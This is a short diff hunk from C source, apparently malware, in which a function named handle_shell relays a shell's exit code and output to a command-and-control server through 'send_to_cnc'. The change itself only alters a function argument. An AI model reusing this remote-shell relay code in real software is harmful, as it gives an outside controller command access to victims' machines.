@@ -62,7 +62,7 @@ void handle_shell()
     send_to_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
     while (TRUE)
     {
-        bytes_read = read_shell_output(cmd.out, sizeof(cmd.out));
+        bytes_read = read_shell_output(&cmd);
         send_to_cnc(&bytes_read, sizeof(bytes_read));
         if (!bytes_read)
             return;
